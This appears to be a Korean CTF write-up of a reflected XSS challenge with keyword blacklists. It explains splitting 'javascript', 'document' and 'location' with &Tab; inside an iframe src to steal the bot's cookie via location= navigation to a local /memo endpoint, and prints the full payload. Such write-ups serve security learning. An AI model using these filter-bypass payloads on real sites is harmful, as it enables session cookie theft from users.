---
title: "XSS Filtering Bypass Advanced (DH, S3)"
date: 2026-06-24
draft: false
tags: ["XSS"]
ShowToc: true
---

## TL;DR

- 취약점: `/vuln?param=`이 입력을 HTML 본문에 그대로 출력(reflected) + 이중 블랙리스트 필터
- 핵심 트릭: 막힌 글자가 '이름'(태그/속성)이면 못 깨고, 'URL 안 글자'면 `&Tab;`로 깬다 → `javascript:`만 생존, `<iframe src>` 자동 로드 + 괄호 막혀 `location=` navigation으로 exfil
- 페이로드: `<iframe src="javasc&Tab;ript:locatio&Tab;n='http://127.0.0.1:8000/memo?memo='+docu&Tab;ment.cookie">`

## 분석

| 엔드포인트 | 동작 |
|---|---|
| `/vuln` | `param`을 HTML 본문에 그대로 출력(reflected) |
| `/flag` | FLAG 쿠키 든 봇이 `/vuln` 방문 |
| `/memo` | 받은 값을 저장·표시 → 같은 출처 exfil 통로 |

```python
_filter  = ["script", "on", "javascript"]
advanced = ["window", "self", "this", "document", "location", "(", ")", "&#"]
```

## 취약점

입력이 HTML 본문에 그대로 출력 → reflected XSS.
급소: 두 블랙리스트가 `script`/`on`/`javascript`와 `window`/`document`/`location`/괄호 등을 차단. 단 차단 방식이 글자 단위라, 막힌 토큰이 '이름'인지 'URL 안 글자'인지에 따라 우회 가능 여부가 갈린다.

## 공격

흐름은 XSS-1·2와 동일(봇이 `/vuln` 방문·실행 → 쿠키를 `/memo`로 → 공격자 확인).

1. 도구 선택: `script`(태그명)·`on`(속성명)은 이름이라 탭을 끼우면 토큰 인식 자체가 깨짐 → 불가. `javascript:`(URL 안 글자)만 탭으로 깸 → URL 받는 속성이 필요하고, 봇은 클릭 안 하니 자동 로드되는 `<iframe src>` 사용
2. exfil 수단: `new Image()`류는 괄호 `()`가 막힘 → 괄호 없는 navigation으로. `location='주소'+쿠키` → 봇이 쿠키를 `memo` 파라미터에 실어 그 주소로 이동
3. 막힌 단어 셋을 `&Tab;`로 끊기: `javasc&Tab;ript` / `docu&Tab;ment` / `locatio&Tab;n` (`location` 끝의 `on`도 걸리므로 `o`와 `n` 사이를 끊음). 문자열은 작은따옴표로(`src`의 큰따옴표와 안 겹치게)
4. 전송 인코딩: `&Tab;`의 `&`를 `%26`로 보냄(그냥 `&`면 URL param 구분자로 잘림). 서버가 `&`로 디코딩하면 `&Tab;` 글자 복원. `%09`(탭 자체)와 구분 — 그건 서버가 받자마자 탭으로 풀어 필터 전에 사라짐, 여기선 `&Tab;` 글자를 브라우저까지 살려야 함

```html
<iframe src="javasc&Tab;ript:locatio&Tab;n='http://127.0.0.1:8000/memo?memo='+docu&Tab;ment.cookie">
```

검증: PoC는 괄호가 막히므로 백틱 호출로 — `javasc&Tab;ript:alert`1`` 류로 스킴 우회 작동을 먼저 확인한 뒤 본 페이로드 제출.

> 핵심 당위: 우회의 분기점은 막힌 글자가 '이름'이냐 'URL 안 글자'냐다. 태그/속성 이름은 파서가 하나의 토큰으로 읽어 탭을 못 끼우지만, URL 안 글자는 URL 파서가 탭을 무시·제거하므로 `&Tab;`로 분해해도 복원된다.

## 배운 점

- 우회 분기점: 막힌 글자가 이름(태그/속성) vs URL 안 글자 → 전자는 불가, 후자는 `&Tab;`로 분해
- 괄호 차단 시 exfil: 호출(`new Image()`)을 버리고 괄호 없는 navigation(`location=`)으로 전환
- 인코딩 구분: `&Tab;`를 살리려면 `&`만 `%26` (탭을 `%09`로 보내면 필터 전에 디코딩돼 사라짐)
- 같은 출처 `/memo`가 exfil 통로 → XSS-1·2와 동일한 골격, 필터 난이도만 상승